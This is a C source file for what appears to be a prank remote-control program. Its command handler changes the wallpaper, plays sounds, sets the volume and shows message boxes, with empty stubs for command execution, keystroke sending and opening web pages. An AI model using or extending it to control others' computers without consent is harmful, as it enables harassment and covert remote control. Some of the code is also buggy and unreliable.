#include "Funnies.h"

WINBOOL changeWallpaper(char *path)
{
    return SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, path, SPIF_UPDATEINIFILE);
}

const char *PCName;
static char wallpaper[MAX_PATH] = BADPATH;

void sendError(const char *message) {
    printf("ERROR: \"%s\"\n", message);
}

void execCommand(JBCMD cmd)
{
    // If strings are different then fail.
    if (strcmp(cmd.auth, PCName)) {
        sendError("Auth failed.\n");
        return;
    }


    switch (cmd.cmd)
    {
    /* --- Templates --- */
    case JB_FUN:
        
        break;
    case JB_DEACTIVE:

        break;
    case JB_REMOVE:

        break;

    /* --- Sounds --- */
    case JB_VOLUME:
        waveOutSetVolume(NULL, atoi(cmd.args));
        break;
    case JB_SZAMBO:
        // path up to change
        PlaySound(cmd.args, NULL, SND_FILENAME | SND_ASYNC);
        break;

    /* --- Wallpaper --- */
    case JB_SETWALL:
        changeWallpaper(cmd.args);
        break;
    case JB_SAVEWALL:
        memcpy(wallpaper, cmd.args, CMD_ARGSZ > MAX_PATH ? MAX_PATH : CMD_ARGSZ);   // Use the smaller value, 256 > 260 then use 256, 512 > 260 then use 260
        break;
    case JB_LOADWALL:
        if (!strcmp(wallpaper, BADPATH)) {
            sendError("No saved wallpaper");
            break;
        }
        
        changeWallpaper(wallpaper);
        break;

    /* --- Shortcuts --- */
    case JB_CREATELINKS:

        break;
    case JB_REMOVELINKS:

        break;
    case JB_OPENWEB:

        break;

    /* --- Other --- */
    case JB_CDEJECT:

        break;
    
    /*
    case JB_POPUPW:
        //wchar_t wideBuffer[CMD_ARGSZ * 2];
        //MultiByteToWideChar(CP_ACP, MB_COMPOSITE, cmd.args, CMD_ARGSZ, wideBuffer, CMD_ARGSZ * 2)
        char *arg1 = strtok(cmd.args, SEP);
        if(!arg1) {
            sendError("Not enought arguments");
            break;
        }

        int len = MultiByteToWideChar(CP_ACP, 0, arg1, -1, NULL, 0);

        wchar_t *msg = malloc(sizeof(len));
        MultiByteToWideChar(CP_ACP, MB_COMPOSITE, arg1, -1, msg, len);

        char *arg2 = strtok(NULL, SEP);

        if(!arg2)
            wTitle = L"JB";

        MessageBoxW(NULL, msg, wTitle, 0);

        free(msg);
        break;
    */
    case JB_POPUPA:
        char *arg1 = strtok(cmd.args, SEP);
        char *arg2 = strtok(NULL, SEP);
        MessageBoxA(NULL, arg1, arg2, 0);
        break;
    case JB_EXEC:

        break;
    case JB_ROTATESCR:

        break;
    case JB_CHANGERES:

        break;
    case JB_SENDKEY:

        break;

    default:

        sendError("Unknown command");
        break;
    }
}